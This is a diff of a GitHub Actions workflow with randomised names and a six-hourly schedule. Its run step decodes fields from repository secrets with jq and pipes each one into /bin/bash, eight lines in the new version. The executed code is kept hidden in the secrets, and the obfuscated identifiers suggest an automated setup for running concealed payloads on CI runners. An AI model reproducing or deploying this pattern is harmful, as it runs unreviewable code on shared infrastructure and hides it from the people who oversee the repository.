@@ -2,9 +2,8 @@ name: luyinsi6734
 on:
   workflow_dispatch:
   schedule:
-    - cron: '22 5/6 * * *'
-
-jobs:  # 13674
+    - cron: '33 2/6 * * *'
+jobs:
   build:
     runs-on: ubuntu-latest
 
@@ -12,13 +11,14 @@ jobs:  # 13674
       - uses: actions/checkout@v4
       - name: luyinsi6734
         env:
-          njf7: ${{ secrets.njf7 }}
+          t3: ${{ secrets.t3 }}
         run: |
-          echo $njf7 | jq -r .hyqst6 | /bin/bash
-          echo $hive3827 | jq -r .aosjj311 | /bin/bash
-          echo $brhj21 | jq -r .xjafh9 | /bin/bash
-          echo $r57 | jq -r .hmhfg729 | /bin/bash
-          echo $wk80112 | jq -r .c6124 | /bin/bash
-          echo $us14930 | jq -r .fauvf870 | /bin/bash
-          echo $rcdib72 | jq -r .bhca77 | /bin/bash
+          echo $t3 | jq -r .ect2977 | /bin/bash
+          echo $nxyn040 | jq -r .etkj5 | /bin/bash
+          echo $epq16 | jq -r .rih67 | /bin/bash
+          echo $bid4 | jq -r .iu0 | /bin/bash
+          echo $mft4116 | jq -r .qv173 | /bin/bash
+          echo $lhkgg809 | jq -r .yiwu4044 | /bin/bash
+          echo $jxc05739 | jq -r .q4 | /bin/bash
+          echo $oee66 | jq -r .evsn09632 | /bin/bash
 
